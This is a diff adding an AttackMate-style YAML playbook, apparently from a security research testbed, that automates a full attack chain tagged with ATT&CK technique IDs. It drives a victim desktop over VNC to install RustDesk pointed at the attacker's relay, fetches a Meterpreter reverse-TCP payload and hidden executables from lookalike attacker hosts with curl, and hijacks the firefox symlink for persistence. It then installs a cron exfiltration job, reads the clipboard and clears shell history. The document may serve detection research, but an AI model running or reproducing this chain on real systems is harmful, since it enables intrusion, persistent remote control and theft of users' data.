@@ -1,0 +1,971 @@
+# Client is persuaded by attacker to download and setup rustdesk screensharing 
+# attacker executes commands on client machine via screensharing to download and executes meterpreter payload
+# persistence via browser binary
+
+vars:
+  PAYLOAD: cmd/unix/python/meterpreter/reverse_tcp
+  LPORT: 4443
+  ATTACKMATE_IP: 192.42.1.174
+  CLIENT_IP: 192.168.50.100
+  MGMT_IP: 192.42.0.201
+  MGMT_USERNAME: aecid
+  CLIENT_VNC_PORT: 5900
+  ATTACKER_VNC_PORT: 5901
+  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb
+
+
+commands:
+  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc)
+  # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
+
+
+##################### SSH TUNNEL VIA MGMT HOST ############################
+
+  - type: shell
+    interactive: true
+    creates_session: tunnel
+    cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
+
+################### SERVE THE FAKE EXECUTABLE ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/firefox-startup
+    port: 8083
+    background: True
+
+################### SERVE VEILTRANSFER CLIENT ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/VeilTransfer/veiltransfer_client_linux
+    port: 8082
+    background: True
+
+################### SERVE THE METERPRETER PAYLOAD ############################
+
+  # tempfile for reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+  
+  # generate reverse shell
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKMATE_IP
+      LPORT: $LPORT
+    local_path: $RSHELL
+  
+  # serve payload via http
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # prepare reverse-shell-listener
+  - type: msf-module
+    creates_session: revshell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKMATE_IP
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+##################### SOCIAL ENGINEERING ON CLIENT ############################
+
+  - type: vnc
+    cmd: capture
+    filename: initial_screenshot.png
+    hostname: localhost
+    port: 5902
+    creates_session: social_engineering
+
+# Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: social_engineering
+    
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  # copy something to the clipboard
+  - type: vnc 
+    cmd: type 
+    input: echo 'Dummy Text' | xclip -selection clipboard
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc 
+    cmd: type 
+    input: "sudo wget -O rustdesk.deb -e use_proxy=yes -e https_proxy=https://192.168.50.254:3128 https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb"
+    session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1105,T1566.004" 
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Ingress Tool Transfer,Phishing: Spearphishing Voice"
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 45
+
+  - type: vnc 
+    cmd: type 
+    input: "sudo apt install -fy ./rustdesk.deb"
+    session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1219" 
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1219" 
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Remote Access Software"
+  
+  - type: sleep
+    seconds: 45
+
+  - type: vnc
+    cmd: type
+    input: "sudo rustdesk --password password"
+    session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
+
+  - type: sleep
+    seconds: 10
+
+# start rustdesk
+  - type: vnc
+    cmd: type
+    input: "rustdesk"
+    session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
+
+  - type: sleep
+    seconds: 2
+
+# option menu
+  - type: vnc
+    cmd: move
+    x: 167
+    y: 188
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# network
+  - type: vnc
+    cmd: move
+    x: 82
+    y: 272
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# unlock network settings
+  - type: vnc
+    cmd: move
+    x: 468
+    y: 131
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# enter password
+
+  - type: vnc
+    cmd: type
+    input: "garland"
+    session: social_engineering
+    
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+# id relay server
+  - type: vnc
+    cmd: move
+    x: 268
+    y: 182
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# Enter id server IP
+  - type: vnc
+    cmd: type
+    input: $ATTACKMATE_IP
+    session: social_engineering
+    metadata:
+      techniques: "T1219" # Configuring Remote Access SW to connect to attacker C2
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+# click ok
+  - type: vnc
+    cmd: move
+    x: 621
+    y: 490
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# open a fresh terminal
+
+# Opening a new terminal from the menu in the client that the attacker will be able to use
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: social_engineering
+    
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  
+##################### ATTACKER CONFIGURES THEIR RUSTDESK CLIENT ############################
+
+# connect to attacker screen
+  - type: vnc
+    cmd: capture
+    filename: initial_screenshot.png
+    hostname: localhost
+    port: 5900
+    creates_session: attacker
+
+# Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 10
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: attacker
+    
+  - type: sleep
+    seconds: 10
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 10
+
+  - type: shell
+    cmd: grep 'update_pk' /var/log/rustdesk/signalserver.log | awk '{last=$7} END{print last}'
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: CLIENT_RUSTDESK_ID
+
+  - type: shell
+    cmd: cat rustdesk_public_key.txt
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: RUSTDESK_KEY
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: type
+    input: "rustdesk"
+    session: attacker
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 10
+
+# enter the attacker ID in the rustdesk client on the attacker machine
+
+# option menu
+  - type: vnc
+    cmd: move
+    x: 167
+    y: 188
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+# network
+  - type: vnc
+    cmd: move
+    x: 82
+    y: 272
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+# unlock network settings
+  - type: vnc
+    cmd: move
+    x: 468
+    y: 131
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: type
+    input: "aecid"
+    session: attacker
+    
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 2
+
+# id relay server
+  - type: vnc
+    cmd: move
+    x: 351
+    y: 182
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# Enter id server IP
+  - type: vnc
+    cmd: type
+    input: $ATTACKMATE_IP
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# Key Field
+  - type: vnc
+    cmd: move
+    x: 334
+    y: 439
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# Enter key
+  - type: vnc
+    cmd: type
+    input: $RUSTDESK_KEY
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# click ok
+  - type: vnc
+    cmd: move
+    x: 621
+    y: 490
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+##################### ATTACKER CONNECTS TO CLIENT WITH RUSTDESK ############################
+
+# Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 7
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: attacker
+    
+  - type: sleep
+    seconds: 7
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 7
+
+ # open rustdesk with client id and client  from the terminal
+  - type: vnc 
+    cmd: type 
+    input: "rustdesk --connect $CLIENT_RUSTDESK_ID -p password"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 20
+
+## accept connection on the client side
+
+  - type: vnc
+    cmd: move
+    x: 802
+    y: 489
+    session: social_engineering
+    metadata:
+      techniques: "T1219" 
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+    metadata:
+      techniques: "T1219" 
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
+
+  - type: sleep
+    seconds: 5
+
+## attackers interactions via screenshares on the client desktop
+# select the vnc tab
+
+  - type: vnc
+    cmd: move
+    x: 581
+    y: 754
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+  # click into the open client terminal on the client screen
+  - type: vnc
+    cmd: move
+    x: 200
+    y: 200
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+  # download fake install script
+  - type: vnc
+    cmd: type
+    input: "curl -o /home/judy/.index facebock.com:8080/index"
+    session: attacker
+    metadata:
+      techniques: "T1105,T1219,T1564.001" 
+      tactics: "Command and Control,Execution,Defense Evasion"
+      technique_name: "Ingress Tool Transfer,Remote Access Software,Hide Artifacts: Hidden Files and Directories"
+    
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+    metadata:
+      techniques: "T1105,T1219,T1564.001"
+      tactics: "Command and Control,Execution,Defense Evasion"
+      technique_name: "Ingress Tool Transfer,Remote Access Software,Hide Artifacts: Hidden Files and Directories"
+
+  - type: sleep
+    seconds: 10
+
+  # make it executable
+  - type: vnc
+    cmd: type
+    input: "sudo chmod +x /home/judy/.index"
+    session: attacker
+    metadata:
+      techniques: "T1222.002,T1219" 
+      tactics: "Defense Evasion,Execution"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
+    
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+    metadata:
+      techniques: "T1222.002,T1219" 
+      tactics: "Defense Evasion,Execution"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
+
+  - type: sleep
+    seconds: 5
+
+#### Persistence OPTION A set up a fake firefox binary that executes the reverse shell and then the actual firefox
+
+
+  # download the fake executable from attacker webserver
+  - type: vnc
+    cmd: type
+    input: "curl -o /home/judy/.local/share/firefox/firefox-startup 192.42.1.174:8083/index"
+    session: attacker
+    metadata:
+      techniques: "T1105,T1219" 
+      tactics: "Command and Control,Execution"
+      technique_name: "Ingress Tool Transfer,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+    metadata:
+      techniques: "T1105,T1219" 
+      tactics: "Command and Control,Execution"
+      technique_name: "Ingress Tool Transfer,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+  # make it executable
+  - type: vnc
+    cmd: type
+    input: "chmod +x /home/judy/.local/share/firefox/firefox-startup"
+    session: attacker
+    metadata:
+      techniques: "T1222.002,T1219" 
+      tactics: "Defense Evasion,Execution"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+    metadata:
+      techniques: "T1222.002,T1219"
+      tactics: "Defense Evasion,Execution"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
+
+  - type: sleep
+    seconds: 3
+
+  # change the symlink in .local/bin from the actual firefox to the fake firefox binary
+  - type: vnc
+    cmd: type
+    input: "ln -sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox"
+    session: attacker
+    metadata:
+      techniques: "T1574.008,T1219" 
+      tactics: "Persistence,Defense Evasion,Execution"
+      technique_name: "Hijack Execution Flow: Path Interception by Search Order Hijacking,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+    metadata:
+      techniques: "T1574.008,T1219" 
+      tactics: "Persistence,Defense Evasion,Execution"
+      technique_name: "Hijack Execution Flow: Path Interception by Search Order Hijacking,Remote Access Software"
+
+  - type: sleep
+    seconds: 3
+
+  # execute /home/judy/.index via the fake firefox executable
+  - type: vnc
+    cmd: type
+    input: "firefox"
+    session: attacker
+    metadata:
+      techniques: "T1059.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+    metadata:
+      techniques: "T1059.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell,Remote Access Software"
+
+  - type: sleep
+    seconds: 3
+
+################### ATTACKER GATHERS INFORMATION ############################
+
+  # run commands via reverse shell
+  - type: msf-session
+    stdapi: true
+    session: revshell
+    cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
+      technique_name: "System Information Discovery"
+
+  # upload cronjob that extracts data
+  - type: msf-session
+    session: revshell
+    cmd: upload downloader.sh
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
+
+  # Prepare for upgradeshell
+  - type: setvar
+    cmd: revshell
+    variable: $UPGRADESESSION
+
+  - type: include
+    local_path: upgrade.yml
+
+################### ATTACKER GATHERS INFORMATION ############################
+
+  # download the veiltransfer_client_linux executable
+  - type: msf-session
+    cmd: curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index
+    session: revshell
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
+
+  # get the last clipboard entry
+  - type: msf-session
+    session: revshell
+    cmd: xclip -selection clipboard -o
+    metadata:
+      techniques: "T1115"
+      tactics: "Collection"
+      technique_name: "Clipboard Data"
+
+  # make the veiltransfer client binary executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/.local/bin/task_runner
+    metadata:
+      techniques: "T1222.002"
+      tactics: "Defense Evasion" 
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification" 
+
+  # make the downloader script executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/downloader.sh
+    metadata:
+      techniques: "T1222.002"
+      tactics: "Defense Evasion" 
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
+
+  # add the cronjob 
+  - type: msf-session
+    session: revshell
+    cmd: crontab -e
+    metadata:
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+
+  - type: msf-session
+    session: revshell
+    cmd: ":inoremap jj <ESC>"
+    metadata:
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+
+  - type: msf-session
+    session: revshell
+    cmd: "o"
+    metadata:
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+
+  - type: msf-session
+    session: revshell
+    cmd: "*/10 * * * * /home/judy/download.sh"
+    metadata:
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+
+  - type: msf-session
+    session: revshell
+    cmd: "jj"
+    metadata:
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+
+  - type: msf-session
+    session: revshell
+    cmd: ":wq!\n"
+    metadata:
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+
+  # find out which windown are open
+  - type: msf-session
+    session: revshell
+    cmd:  wmctrl -l
+    metadata:
+      techniques: "T1010"
+      tactics: "Discovery"
+      technique_name: "Application Window Discovery"
+
+  # clear history
+  - type: msf-session
+    session: revshell
+    cmd: history -c
+    metadata:
+      techniques: "T1070.003"
+      tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: Clear Command History"
+
+  # exit the interactive shell
+  - type: msf-session
+    session: revshell
+    cmd: exit
+
+
+  
+
+
+
+  
